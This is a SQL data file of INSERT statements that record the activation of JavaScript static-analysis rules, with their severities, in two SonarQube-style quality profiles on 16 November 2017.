INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (437, '2017-11-16 07:37:04.182', NULL, 'key=js-sonar-way-87564:javascript:S1764;ruleKey=javascript:S1764;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn22bbGRdfPp-qjj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (438, '2017-11-16 07:37:04.185', NULL, 'key=js-sonar-way-87564:javascript:S1145;ruleKey=javascript:S1145;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn25bbGRdfPp-qjk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (439, '2017-11-16 07:37:04.188', NULL, 'key=js-sonar-way-87564:javascript:LabelPlacement;ruleKey=javascript:LabelPlacement;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn28bbGRdfPp-qjl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (440, '2017-11-16 07:37:04.192', NULL, 'key=js-sonar-way-87564:javascript:S2234;ruleKey=javascript:S2234;profileKey=js-sonar-way-87564;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3AbbGRdfPp-qjm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (441, '2017-11-16 07:37:04.195', NULL, 'key=js-sonar-way-87564:javascript:S2681;ruleKey=javascript:S2681;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3DbbGRdfPp-qjn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (442, '2017-11-16 07:37:04.199', NULL, 'key=js-sonar-way-87564:javascript:MultilineStringLiterals;ruleKey=javascript:MultilineStringLiterals;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3HbbGRdfPp-qjo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (443, '2017-11-16 07:37:04.202', NULL, 'key=js-sonar-way-87564:javascript:NamedFunctionExpression;ruleKey=javascript:NamedFunctionExpression;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3KbbGRdfPp-qjp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (444, '2017-11-16 07:37:04.206', NULL, 'key=js-sonar-way-87564:javascript:NestedIfDepth;ruleKey=javascript:NestedIfDepth;profileKey=js-sonar-way-87564;param_maximumNestingLevel=3;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3ObbGRdfPp-qjq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (445, '2017-11-16 07:37:04.21', NULL, 'key=js-sonar-way-87564:javascript:S2999;ruleKey=javascript:S2999;profileKey=js-sonar-way-87564;param_considerJSDoc=false;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3SbbGRdfPp-qjr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (446, '2017-11-16 07:37:04.214', NULL, 'key=js-sonar-way-87564:javascript:S1219;ruleKey=javascript:S1219;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3WbbGRdfPp-qjs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (447, '2017-11-16 07:37:04.218', NULL, 'key=js-sonar-way-87564:javascript:NonEmptyCaseWithoutBreak;ruleKey=javascript:NonEmptyCaseWithoutBreak;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3ZbbGRdfPp-qjt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (448, '2017-11-16 07:37:04.221', NULL, 'key=js-sonar-way-87564:javascript:S1697;ruleKey=javascript:S1697;profileKey=js-sonar-way-87564;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3dbbGRdfPp-qju');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (449, '2017-11-16 07:37:04.225', NULL, 'key=js-sonar-way-87564:javascript:OctalNumber;ruleKey=javascript:OctalNumber;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3hbbGRdfPp-qjv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (450, '2017-11-16 07:37:04.228', NULL, 'key=js-sonar-way-87564:javascript:OneStatementPerLine;ruleKey=javascript:OneStatementPerLine;profileKey=js-sonar-way-87564;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3kbbGRdfPp-qjw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (451, '2017-11-16 07:37:04.232', NULL, 'key=js-sonar-way-87564:javascript:PrimitiveWrappers;ruleKey=javascript:PrimitiveWrappers;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3obbGRdfPp-qjx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (452, '2017-11-16 07:37:04.235', NULL, 'key=js-sonar-way-87564:javascript:S2814;ruleKey=javascript:S2814;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3rbbGRdfPp-qjy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (453, '2017-11-16 07:37:04.239', NULL, 'key=js-sonar-way-87564:javascript:S2432;ruleKey=javascript:S2432;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3vbbGRdfPp-qjz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (454, '2017-11-16 07:37:04.242', NULL, 'key=js-sonar-way-87564:javascript:S1126;ruleKey=javascript:S1126;profileKey=js-sonar-way-87564;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn3ybbGRdfPp-qj0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (455, '2017-11-16 07:37:04.245', NULL, 'key=js-sonar-way-87564:javascript:S1656;ruleKey=javascript:S1656;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn31bbGRdfPp-qj1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (456, '2017-11-16 07:37:04.249', NULL, 'key=js-sonar-way-87564:javascript:S3499;ruleKey=javascript:S3499;profileKey=js-sonar-way-87564;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn35bbGRdfPp-qj2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (457, '2017-11-16 07:37:04.252', NULL, 'key=js-sonar-way-87564:javascript:StrictMode;ruleKey=javascript:StrictMode;profileKey=js-sonar-way-87564;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn38bbGRdfPp-qj3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (458, '2017-11-16 07:37:04.256', NULL, 'key=js-sonar-way-87564:javascript:S3402;ruleKey=javascript:S3402;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4AbbGRdfPp-qj4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (459, '2017-11-16 07:37:04.259', NULL, 'key=js-sonar-way-87564:javascript:S3003;ruleKey=javascript:S3003;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4DbbGRdfPp-qj5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (460, '2017-11-16 07:37:04.262', NULL, 'key=js-sonar-way-87564:javascript:S1301;ruleKey=javascript:S1301;profileKey=js-sonar-way-87564;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4GbbGRdfPp-qj6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (461, '2017-11-16 07:37:04.268', NULL, 'key=js-sonar-way-87564:javascript:SwitchWithoutDefault;ruleKey=javascript:SwitchWithoutDefault;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4LbbGRdfPp-qj7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (462, '2017-11-16 07:37:04.271', NULL, 'key=js-sonar-way-87564:javascript:S1135;ruleKey=javascript:S1135;profileKey=js-sonar-way-87564;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4PbbGRdfPp-qj8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (463, '2017-11-16 07:37:04.275', NULL, 'key=js-sonar-way-87564:javascript:S930;ruleKey=javascript:S930;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4TbbGRdfPp-qj9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (464, '2017-11-16 07:37:04.279', NULL, 'key=js-sonar-way-87564:javascript:TooManyBreakOrContinueInLoop;ruleKey=javascript:TooManyBreakOrContinueInLoop;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4XbbGRdfPp-qj-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (465, '2017-11-16 07:37:04.284', NULL, 'key=js-sonar-way-87564:javascript:S104;ruleKey=javascript:S104;profileKey=js-sonar-way-87564;param_maximum=1000;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4cbbGRdfPp-qj_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (466, '2017-11-16 07:37:04.289', NULL, 'key=js-sonar-way-87564:javascript:S138;ruleKey=javascript:S138;profileKey=js-sonar-way-87564;param_max=100;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4hbbGRdfPp-qkA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (467, '2017-11-16 07:37:04.293', NULL, 'key=js-sonar-way-87564:javascript:S3002;ruleKey=javascript:S3002;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4lbbGRdfPp-qkB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (468, '2017-11-16 07:37:04.296', NULL, 'key=js-sonar-way-87564:javascript:S3353;ruleKey=javascript:S3353;profileKey=js-sonar-way-87564;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4obbGRdfPp-qkC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (469, '2017-11-16 07:37:04.3', NULL, 'key=js-sonar-way-87564:javascript:S2137;ruleKey=javascript:S2137;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4sbbGRdfPp-qkD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (470, '2017-11-16 07:37:04.304', NULL, 'key=js-sonar-way-87564:javascript:UnreachableCode;ruleKey=javascript:UnreachableCode;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn4wbbGRdfPp-qkE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (471, '2017-11-16 07:37:04.309', NULL, 'key=js-sonar-way-87564:javascript:UnusedFunctionArgument;ruleKey=javascript:UnusedFunctionArgument;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn41bbGRdfPp-qkF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (472, '2017-11-16 07:37:04.313', NULL, 'key=js-sonar-way-87564:javascript:UnusedVariable;ruleKey=javascript:UnusedVariable;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn45bbGRdfPp-qkG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (473, '2017-11-16 07:37:04.317', NULL, 'key=js-sonar-way-87564:javascript:S3500;ruleKey=javascript:S3500;profileKey=js-sonar-way-87564;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn49bbGRdfPp-qkH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (474, '2017-11-16 07:37:04.321', NULL, 'key=js-sonar-way-87564:javascript:S905;ruleKey=javascript:S905;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn5BbbGRdfPp-qkI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (475, '2017-11-16 07:37:04.324', NULL, 'key=js-sonar-way-87564:javascript:S2123;ruleKey=javascript:S2123;profileKey=js-sonar-way-87564;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn5EbbGRdfPp-qkJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (476, '2017-11-16 07:37:04.328', NULL, 'key=js-sonar-way-87564:javascript:S1154;ruleKey=javascript:S1154;profileKey=js-sonar-way-87564;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn5IbbGRdfPp-qkK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (477, '2017-11-16 07:37:04.332', NULL, 'key=js-sonar-way-87564:javascript:VariableDeclarationAfterUsage;ruleKey=javascript:VariableDeclarationAfterUsage;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn5LbbGRdfPp-qkL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (478, '2017-11-16 07:37:04.337', NULL, 'key=js-sonar-way-87564:jkvascript:S2703;ruleKey=javascript:S2703;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn5RbbGRdfPp-qkM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (479, '2017-11-16 07:37:04.341', NULL, 'key=js-sonar-way-87564:javascript:WithStatement;ruleKey=javascript:WithStatement;profileKey=js-sonar-way-87564;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn5VbbGRdfPp-qkN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (480, '2017-11-16 07:37:04.351', NULL, 'key=js-sonar-security-way-17928:javascript:S1442;ruleKey=javascript:S1442;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn5fbbGRdfPp-qkO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (481, '2017-11-16 07:37:04.357', NULL, 'key=js-sonar-security-way-17928:javascript:ArrayAndObjectConstructors;ruleKey=javascript:ArrayAndObjectConstructors;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn5lbbGRdfPp-qkP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (482, '2017-11-16 07:37:04.365', NULL, 'key=js-sonar-security-way-17928:javascript:AssignmentWithinCondition;ruleKey=javascript:AssignmentWithinCondition;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn5tbbGRdfPp-qkQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (483, '2017-11-16 07:37:04.371', NULL, 'key=js-sonar-security-way-17928:javascript:BoundOrAssignedEvalOrArguments;ruleKey=javascript:BoundOrAssignedEvalOrArguments;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn5zbbGRdfPp-qkR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (484, '2017-11-16 07:37:04.377', NULL, 'key=js-sonar-security-way-17928:javascript:S2688;ruleKey=javascript:S2688;profileKey=js-sonar-security-way-17928;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn55bbGRdfPp-qkS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (485, '2017-11-16 07:37:04.382', NULL, 'key=js-sonar-security-way-17928:javascript:S2228;ruleKey=javascript:S2228;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn5-bbGRdfPp-qkT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (486, '2017-11-16 07:37:04.386', NULL, 'key=js-sonar-security-way-17928:javascript:S1854;ruleKey=javascript:S1854;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6CbbGRdfPp-qkU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (487, '2017-11-16 07:37:04.391', NULL, 'key=js-sonar-security-way-17928:javascript:DebuggerStatement;ruleKey=javascript:DebuggerStatement;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6HbbGRdfPp-qkV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (488, '2017-11-16 07:37:04.396', NULL, 'key=js-sonar-security-way-17928:javascript:S1788;ruleKey=javascript:S1788;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6MbbGRdfPp-qkW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (489, '2017-11-16 07:37:04.4', NULL, 'key=js-sonar-security-way-17928:javascript:S2870;ruleKey=javascript:S2870;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6QbbGRdfPp-qkX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (490, '2017-11-16 07:37:04.404', NULL, 'key=js-sonar-security-way-17928:javascript:S3001;ruleKey=javascript:S3001;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6UbbGRdfPp-qkY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (491, '2017-11-16 07:37:04.407', NULL, 'key=js-sonar-security-way-17928:javascript:S3403;ruleKey=javascript:S3403;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6XbbGRdfPp-qkZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (492, '2017-11-16 07:37:04.411', NULL, 'key=js-sonar-security-way-17928:javascript:S1871;ruleKey=javascript:S1871;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6bbbGRdfPp-qka');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (493, '2017-11-16 07:37:04.415', NULL, 'key=js-sonar-security-way-17928:javascript:S1862;ruleKey=javascript:S1862;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6fbbGRdfPp-qkb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (494, '2017-11-16 07:37:04.418', NULL, 'key=js-sonar-security-way-17928:javascript:DuplicateFunctionArgument;ruleKey=javascript:DuplicateFunctionArgument;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6ibbGRdfPp-qkc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (495, '2017-11-16 07:37:04.422', NULL, 'key=js-sonar-security-way-17928:javascript:DuplicatePropertyName;ruleKey=javascript:DuplicatePropertyName;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6mbbGRdfPp-qkd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (496, '2017-11-16 07:37:04.426', NULL, 'key=js-sonar-security-way-17928:javascript:EmptyBlock;ruleKey=javascript:EmptyBlock;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6qbbGRdfPp-qke');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (497, '2017-11-16 07:37:04.431', NULL, 'key=js-sonar-security-way-17928:javascript:Eval;ruleKey=javascript:Eval;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6vbbGRdfPp-qkf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (498, '2017-11-16 07:37:04.434', NULL, 'key=js-sonar-security-way-17928:javascript:ForIn;ruleKey=javascript:ForIn;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn6ybbGRdfPp-qkg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (499, '2017-11-16 07:37:04.438', NULL, 'key=js-sonar-security-way-17928:javascript:S1994;ruleKey=javascript:S1994;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn62bbGRdfPp-qkh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (500, '2017-11-16 07:37:04.441', NULL, 'key=js-sonar-security-way-17928:javascript:S2251;ruleKey=javascript:S2251;profileKey=js-sonar-security-way-17928;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn65bbGRdfPp-qki');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (501, '2017-11-16 07:37:04.445', NULL, 'key=js-sonar-security-way-17928:javascript:FunctionDefinitionInsideLoop;ruleKey=javascript:FunctionDefinitionInsideLoop;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn69bbGRdfPp-qkj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (502, '2017-11-16 07:37:04.448', NULL, 'key=js-sonar-security-way-17928:javascript:S2990;ruleKey=javascript:S2990;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn7AbbGRdfPp-qkk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (503, '2017-11-16 07:37:04.452', NULL, 'key=js-sonar-security-way-17928:javascript:HtmlComments;ruleKey=javascript:HtmlComments;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn7EbbGRdfPp-qkl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (504, '2017-11-16 07:37:04.455', NULL, 'key=js-sonar-security-way-17928:javascript:S1764;ruleKey=javascript:S1764;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn7HbbGRdfPp-qkm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (505, '2017-11-16 07:37:04.459', NULL, 'key=js-sonar-security-way-17928:javascript:S3271;ruleKey=javascript:S3271;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn7LbbGRdfPp-qkn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (506, '2017-11-16 07:37:04.463', NULL, 'key=js-sonar-security-way-17928:javascript:S2234;ruleKey=javascript:S2234;profileKey=js-sonar-security-way-17928;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn7PbbGRdfPp-qko');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (507, '2017-11-16 07:37:04.467', NULL, 'key=js-sonar-security-way-17928:javascript:S2681;ruleKey=javascript:S2681;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn7TbbGRdfPp-qkp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (508, '2017-11-16 07:37:04.471', NULL, 'key=js-sonar-security-way-17928:javascript:S2999;ruleKey=javascript:S2999;profileKey=js-sonar-security-way-17928;param_considerJSDoc=false;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn7XbbGRdfPp-qkq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (509, '2017-11-16 07:37:04.475', NULL, 'key=js-sonar-security-way-17928:javascript:S1697;ruleKey=javascript:S1697;profileKey=js-sonar-security-way-17928;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn7bbbGRdfPp-qkr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (510, '2017-11-16 07:37:04.481', NULL, 'key=js-sonar-security-way-17928:javascript:S2814;ruleKey=javascript:S2814;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn7hbbGRdfPp-qks');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (511, '2017-11-16 07:37:04.492', NULL, 'key=js-sonar-security-way-17928:javascript:S2432;ruleKey=javascript:S2432;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn7sbbGRdfPp-qkt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (512, '2017-11-16 07:37:04.499', NULL, 'key=js-sonar-security-way-17928:javascript:S1656;ruleKey=javascript:S1656;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn7ybbGRdfPp-qku');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (513, '2017-11-16 07:37:04.505', NULL, 'key=js-sonar-security-way-17928:javascript:TrailingComma;ruleKey=javascript:TrailingComma;profileKey=js-sonar-security-way-17928;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn75bbGRdfPp-qkv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (514, '2017-11-16 07:37:04.52', NULL, 'key=js-sonar-security-way-17928:javascript:S3002;ruleKey=javascript:S3002;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn8IbbGRdfPp-qkw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (515, '2017-11-16 07:37:04.525', NULL, 'key=js-sonar-security-way-17928:javascript:S3500;ruleKey=javascript:S3500;profileKey=js-sonar-security-way-17928;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn8NbbGRdfPp-qkx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (516, '2017-11-16 07:37:04.53', NULL, 'key=js-sonar-security-way-17928:javascript:S905;ruleKey=javascript:S905;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn8SbbGRdfPp-qky');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (517, '2017-11-16 07:37:04.534', NULL, 'key=js-sonar-security-way-17928:javascript:S2123;ruleKey=javascript:S2123;profileKey=js-sonar-security-way-17928;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn8WbbGRdfPp-qkz');
